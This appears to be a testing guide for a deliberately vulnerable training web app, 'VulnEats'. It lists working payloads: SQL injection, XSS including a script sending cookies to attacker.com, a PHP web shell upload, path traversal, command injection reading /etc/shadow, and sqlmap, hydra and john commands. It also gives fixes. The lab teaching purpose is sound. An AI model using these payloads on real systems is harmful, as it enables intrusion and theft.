# VulnEats Security Testing Guide

This guide provides step-by-step instructions for testing the deliberate vulnerabilities in the VulnEats application.

## 🎯 Testing Environment Setup

### Prerequisites
- VulnEats application running on `http://localhost:5000`
- Web browser with developer tools
- Burp Suite (optional but recommended)
- OWASP ZAP (optional)

### Default Credentials
- **Admin**: `admin` / `admin123`
- **Restaurant Owner**: `restaurant1` / `password123`
- **Customer**: `customer1` / `password123`

## 🗂 Vulnerability Testing Guide

### 1. SQL Injection (Search Functionality)

**Location**: Search box on homepage or search results page
**Vulnerability**: Direct SQL query concatenation

#### Test Steps:
1. Go to the homepage
2. In the search box, enter: `pizza' OR '1'='1`
3. Click search
4. **Expected Result**: All menu items should be returned instead of just pizza items

#### Additional SQL Injection Tests:
```sql
' UNION SELECT 1,2,3,4,5 --
' UNION SELECT username,password,email,role,created_at FROM users --
' OR 1=1 --
' OR '1'='1' --
```

#### Tools to Use:
- **sqlmap**: `sqlmap -u "http://localhost:5000/search?q=test" --dbs`
- **Burp Suite**: Intercept and modify search requests

### 2. Stored XSS (Cross-Site Scripting)

**Location**: Special instructions field when adding items to cart
**Vulnerability**: User input stored and displayed without sanitization

#### Test Steps:
1. Login as a customer
2. Go to any restaurant menu
3. Add an item to cart
4. In the "Special Instructions" field, enter:
   ```html
   <script>alert('XSS')</script>
   ```
5. Add to cart and view cart
6. **Expected Result**: JavaScript alert should execute

#### Additional XSS Payloads:
```html
<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

### 3. Reflected XSS

**Location**: Search results page
**Vulnerability**: User input reflected in response without sanitization

#### Test Steps:
1. Go to search page
2. Enter in search box: `<script>alert('Reflected XSS')</script>`
3. **Expected Result**: JavaScript alert should execute

#### URL-based Test:
```
http://localhost:5000/search?q=<script>alert('XSS')</script>
```

### 4. CSRF (Cross-Site Request Forgery)

**Location**: Delete menu item functionality
**Vulnerability**: No CSRF token protection

#### Test Steps:
1. Login as restaurant owner
2. Create a malicious HTML file with this content:
   ```html
   <html>
   <body>
   <form action="http://localhost:5000/delete_menu_item/1" method="POST">
     <input type="submit" value="Click for free pizza!">
   </form>
   <script>document.forms[0].submit()</script>
   </body>
   </html>
   ```
3. Open the HTML file in browser while logged in
4. **Expected Result**: Menu item should be deleted without user confirmation

### 5. Insecure File Upload

**Location**: Add menu item page (image upload)
**Vulnerability**: Insufficient file type validation

#### Test Steps:
1. Login as restaurant owner
2. Go to "Add Menu Item"
3. Create a file named `shell.php.jpg` with PHP code:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
4. Upload this file as an image
5. Access the uploaded file: `http://localhost:5000/uploads/shell.php.jpg?cmd=id`
6. **Expected Result**: Command should execute

#### Additional File Upload Tests:
- Upload files with double extensions: `shell.php.jpg`
- Upload files with null bytes: `shell.php%00.jpg`
- Upload files with uppercase extensions: `shell.PHP`

### 6. Directory Traversal

**Location**: File upload access
**Vulnerability**: Path traversal in file serving

#### Test Steps:
1. Try accessing: `http://localhost:5000/uploads/../../../config.py`
2. **Expected Result**: Should access files outside upload directory

#### Additional Path Traversal Tests:
```
../config.py
..%2F..%2F..%2Fconfig.py
....//....//....//config.py
```

### 7. Weak Password Storage

**Location**: User authentication
**Vulnerability**: MD5 password hashing

#### Test Steps:
1. Extract password hashes from database
2. Use John the Ripper to crack:
   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
   ```

#### Hash Analysis:
- All passwords are stored as MD5 hashes
- MD5 is cryptographically broken
- Use tools like hashcat or John the Ripper

### 8. No Rate Limiting

**Location**: Login page
**Vulnerability**: No protection against brute force attacks

#### Test Steps:
1. Use Hydra for brute force:
   ```bash
   hydra -l admin -P wordlist.txt localhost http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
   ```

#### Additional Brute Force Tools:
- **Burp Suite**: Intruder module
- **OWASP ZAP**: Fuzzing
- **Custom scripts**: Python requests library

### 9. Command Injection

**Location**: Admin log viewer
**Vulnerability**: Direct command execution

#### Test Steps:
1. Login as admin
2. Go to System Logs
3. In the log file path, enter: `; cat /etc/passwd`
4. **Expected Result**: Should display system password file

#### Additional Command Injection Tests:
```
; ls -la
; whoami
; id
; cat /etc/shadow
```

## 🛠 Testing Tools Setup

### Burp Suite
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Intercept requests and modify parameters
3. Use Repeater for manual testing
4. Use Intruder for automated attacks

### OWASP ZAP
1. Spider the application to discover all pages
2. Run active scan to detect vulnerabilities
3. Use Fuzzer for parameter testing
4. Review scan results and verify manually

### sqlmap
```bash
# Basic scan
sqlmap -u "http://localhost:5000/search?q=test"

# Database enumeration
sqlmap -u "http://localhost:5000/search?q=test" --dbs

# Table enumeration
sqlmap -u "http://localhost:5000/search?q=test" --tables

# Data extraction
sqlmap -u "http://localhost:5000/search?q=test" --dump
```

## 📊 Vulnerability Severity Levels

| Vulnerability | Severity | Impact | Difficulty |
|---------------|----------|--------|------------|
| SQL Injection | Critical | Data breach, system access | Medium |
| XSS | High | Session hijacking, defacement | Low |
| CSRF | High | Unauthorized actions | Medium |
| File Upload | Critical | Remote code execution | High |
| Command Injection | Critical | System compromise | High |
| Directory Traversal | Medium | Information disclosure | Low |
| Weak Passwords | Medium | Account compromise | Low |
| No Rate Limiting | Low | Account lockout bypass | Low |

## 🔧 Remediation Examples

### SQL Injection Fix
```python
# VULNERABLE CODE:
sql = f"SELECT * FROM menu_items WHERE name LIKE '%{query}%'"

# FIXED CODE:
cursor.execute("SELECT * FROM menu_items WHERE name LIKE ?", (f'%{query}%',))
```

### XSS Fix
```python
# VULNERABLE CODE:
{{ user_input | safe }}

# FIXED CODE:
{{ user_input | escape }}
```

### CSRF Fix
```python
# Add CSRF token to forms
<form method="POST">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  <!-- form fields -->
</form>
```

## 📝 Reporting Template

### Vulnerability Report Format
```
Vulnerability: [Type]
Severity: [Critical/High/Medium/Low]
Location: [URL/Function]
Description: [Detailed description]
Steps to Reproduce: [Step-by-step instructions]
Impact: [What can be achieved]
Remediation: [How to fix]
```

## ⚠️ Ethical Testing Guidelines

1. **Only test your own systems** or systems you have explicit permission to test
2. **Document all findings** for educational purposes
3. **Do not perform destructive attacks** that could damage the system
4. **Respect rate limits** and system resources
5. **Report findings responsibly** if testing production systems

## 📚 Additional Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

**Remember**: This guide is for educational purposes. Always practice ethical hacking and only test systems you own or have permission to test.
